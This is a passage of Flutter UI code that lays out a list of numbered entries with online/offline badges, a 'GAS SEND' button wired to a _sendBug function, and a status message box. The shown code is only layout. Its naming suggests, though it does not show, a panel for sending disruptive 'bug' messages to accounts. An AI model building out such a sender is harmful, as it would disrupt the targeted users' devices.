                      right: 0,
                      top: 0,
                      child: Container(
                        width: 10,
                        height: 10,
                        decoration: BoxDecoration(
                          color: connected ? Colors.green : Colors.red,
                          shape: BoxShape.circle,
                          border:
                              Border.all(color: cardDarker, width: 1.5),
                          boxShadow: [
                            BoxShadow(
                              color: (connected ? Colors.green : Colors.red)
                                  .withOpacity(0.6),
                              blurRadius: 4,
                            ),
                          ],
                        ),
                      ),
                    ),
                  ],
                ),

                const SizedBox(width: 12),

                // Name & number
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        name,
                        style: TextStyle(
                          color: connected ? Colors.white : Colors.white38,
                          fontSize: 13,
                          fontWeight: FontWeight.w600,
                          fontFamily: 'Rajdhani',
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                      if (number.isNotEmpty)
                        Text(
                          number,
                          style: TextStyle(
                            color: connected
                                ? color.withOpacity(0.65)
                                : Colors.white24,
                            fontSize: 11,
                            fontFamily: 'Rajdhani',
                          ),
                          overflow: TextOverflow.ellipsis,
                        ),
                    ],
                  ),
                ),

                // Right side: selected check / status badge
                Column(
                  crossAxisAlignment: CrossAxisAlignment.end,
                  children: [
                    if (isSelected)
                      Container(
                        padding: const EdgeInsets.all(4),
                        decoration: BoxDecoration(
                          color: color,
                          shape: BoxShape.circle,
                        ),
                        child: const Icon(Icons.check,
                            color: Colors.white, size: 10),
                      )
                    else
                      Container(
                        width: 20,
                        height: 20,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(
                              color: Colors.white.withOpacity(0.15)),
                        ),
                      ),
                    const SizedBox(height: 4),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 7, vertical: 3),
                      decoration: BoxDecoration(
                        color: connected
                            ? Colors.green.withOpacity(0.12)
                            : Colors.red.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(6),
                        border: Border.all(
                          color: connected
                              ? Colors.green.withOpacity(0.35)
                              : Colors.red.withOpacity(0.3),
                        ),
                      ),
                      child: Text(
                        connected ? 'ON' : 'OFF',
                        style: TextStyle(
                          color: connected ? Colors.green : Colors.red,
                          fontSize: 9,
                          fontWeight: FontWeight.bold,
                          fontFamily: 'Rajdhani',
                        ),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        );
      }).toList(),
    );
  }

  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseAnimation,
      builder: (context, child) {
        return Container(
          width: double.infinity,
          height: 56,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            gradient: LinearGradient(
              colors: [accentBlue, lightBlue],
              begin: Alignment.centerLeft,
              end: Alignment.centerRight,
            ),
            boxShadow: [
              BoxShadow(
                color: accentBlue.withOpacity(0.4),
                blurRadius: 10 + (_pulseAnimation.value - 1.0) * 10,
                offset: const Offset(0, 4),
              ),
            ],
          ),
          child: ElevatedButton(
            onPressed: _isSending ? null : _sendBug,
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.transparent,
              foregroundColor: Colors.white,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(16),
              ),
              elevation: 0,
            ),
            child: _isSending
                ? const SizedBox(
                    width: 20,
                    height: 20,
                    child: CircularProgressIndicator(
                      color: Colors.white,
                      strokeWidth: 2,
                    ),
                  )
                : const Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.send, size: 20),
                      SizedBox(width: 8),
                      Text(
                        "GAS SEND",
                        style: TextStyle(
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
          ),
        );
      },
    );
  }

  Widget _buildResponseMessage() {
    Color backgroundColor;
    Color borderColor;
    Color textColor;
    IconData icon;

    if (_responseMessage!.startsWith('✅')) {
      backgroundColor = successGreen.withOpacity(0.2);
      borderColor = successGreen;
      textColor = successGreen;
      icon = Icons.check_circle;
    } else if (_responseMessage!.startsWith('❌')) {
      backgroundColor = dangerRed.withOpacity(0.2);
      borderColor = dangerRed;
      textColor = dangerRed;
      icon = Icons.error;
    } else {
      backgroundColor = warningOrange.withOpacity(0.2);
      borderColor = warningOrange;
      textColor = warningOrange;
      icon = Icons.info;
    }

    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: backgroundColor,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: borderColor),
      ),
      child: Row(
        children: [
          Icon(icon, color: textColor),
          const SizedBox(width: 12),
          Expanded(
            child: Text(
              _responseMessage!,
              style: TextStyle(
                color: textColor,
                fontWeight: FontWeight.w500,
              ),
            ),
          ),
        ],
      ),
    );
  }
}
